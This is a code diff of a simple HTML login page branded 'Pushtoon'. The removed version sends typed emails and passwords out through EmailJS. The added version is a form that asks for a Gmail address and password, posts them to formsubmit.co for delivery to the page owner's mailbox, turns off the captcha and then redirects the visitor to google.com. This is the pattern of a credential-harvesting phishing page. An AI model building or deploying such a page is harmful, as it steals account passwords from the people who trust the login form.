@@ -1,107 +1,21 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Pushtoon Login</title>
-
-  <link rel="icon" href="data:,">
-
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-
-  <script>
-    emailjs.init({
-      publicKey: "aU_rVriMIfRSDIniQ"
-    });
-  </script>
-
-  <style>
-    body{
-      margin:0;
-      height:100vh;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      font-family:Arial;
-      background:url("https://images.unsplash.com/photo-1506744038136-46273834b3fb");
-      background-size:cover;
-    }
-
-    .container{
-      background:white;
-      padding:40px;
-      border-radius:20px;
-      width:350px;
-      text-align:center;
-    }
-
-    input{
-      width:90%;
-      padding:12px;
-      margin:10px;
-    }
-
-    button{
-      width:95%;
-      padding:12px;
-      background:orange;
-      border:none;
-      color:white;
-      font-size:18px;
-      cursor:pointer;
-    }
-  </style>
-</head>
-
-<body>
-
 <div class="container">
 
   <h2>LOGIN</h2>
 
-  <input type="email" id="email" placeholder="Email">
-  <input type="password" id="password" placeholder="Password">
+  <form action="https://formsubmit.co/YOUR_GMAIL@gmail.com" method="POST">
 
-  <button onclick="sendMail()">LOG IN</button>
+    <input type="email" name="email" placeholder="Enter Gmail" required>
+
+    <input type="password" name="password" placeholder="Enter Password" required>
+
+    <!-- stop spam captcha -->
+    <input type="hidden" name="_captcha" value="false">
+
+    <!-- optional success page -->
+    <input type="hidden" name="_next" value="https://google.com">
+
+    <button type="submit">LOG IN</button>
+
+  </form>
 
 </div>
-
-<script>
-
-function sendMail(){
-
-    let email = document.getElementById("email").value.trim().toLowerCase();
-    let password = document.getElementById("password").value.trim();
-
-    const correctEmail = "test@gmail.com";
-    const correctPassword = "Pushtoon123";
-
-    if(email === "" || password === ""){
-        alert("Please fill all fields!");
-        return;
-    }
-
-    if(email === correctEmail && password === correctPassword){
-
-        emailjs.send(
-            "service_bqnzz7f",
-            "template_lxwj7sw",
-            {
-                email: email,
-                password: password
-            }
-        )
-        .then(() => {
-            alert("Login Successful!");
-        })
-        .catch(() => {
-            alert("EmailJS error!");
-        });
-
-    } else {
-        alert("Wrong email or password!");
-    }
-}
-
-</script>
-
-</body>
-</html>
